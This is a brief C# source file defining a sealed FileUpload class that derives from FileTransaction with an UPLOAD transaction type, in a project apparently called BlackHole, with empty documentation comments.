using BlackHole.Common.Network.Protocol;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Master.Model
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class FileUpload : FileTransaction
    {
        /// <summary>
        /// 
        /// </summary>
        /// <param name="id"></param>
        public FileUpload() : base(TransactionType.UPLOAD)
        {
        }
    }
}
